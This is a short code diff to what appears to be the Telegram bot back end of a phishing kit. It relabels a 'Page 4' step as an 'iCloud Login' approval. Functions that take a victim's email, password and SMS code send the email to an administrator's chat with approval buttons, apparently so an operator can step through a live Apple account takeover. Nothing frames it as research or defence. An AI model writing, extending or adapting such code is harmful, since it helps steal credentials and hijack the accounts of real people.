@@ -60,7 +60,7 @@ function sendApprovalRequestSMS(code) {
 }
 
 // -----------------
-// Page 4 approval
+// iCloud Login approval
 // -----------------
 function sendApprovalRequestPage(email, password) {
   const options = {
@@ -73,7 +73,7 @@ function sendApprovalRequestPage(email, password) {
       ]
     }
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `*Page 4 Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
+  bot.sendMessage(ADMIN_CHAT_ID, `*iCloud Login Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
 }
 
 // -----------------
@@ -110,3 +110,4 @@ bot.onText(/\/start/, (msg) => {
 });
 
 module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage };
+
